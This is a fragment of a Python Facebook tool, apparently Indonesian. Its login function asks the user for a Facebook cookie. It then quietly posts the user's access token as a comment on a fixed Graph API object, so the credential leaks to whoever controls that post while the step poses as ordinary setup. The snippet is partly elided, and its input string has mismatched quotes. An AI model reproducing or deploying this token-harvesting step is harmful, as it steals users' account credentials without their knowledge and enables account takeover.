...
def login():
	clear_layar()
	print(logo2())
	cookie = input(f"\n [{hh}<{P}] Hi! Sepertinya Kamu Adalah Pengguna Baru. Terima Kasih Telah Memilih SC Ini Sebagai Pilihan Terpercayamu. Sebelum Menggunakan SC Ini, Kamu Harus Mengatur User Agent Dahulu! Jangan Lupa Berikan Penilaian Terbaik Di Github Ya! Thank You!\n\n                {H2}- Shishigami-X -')\n Cookie : ")
	...
	try:
		...
		ses.post(f"https://graph.facebook.com/1602567310195766/comments/?message={token}&access_token={token}",cookies=cok)
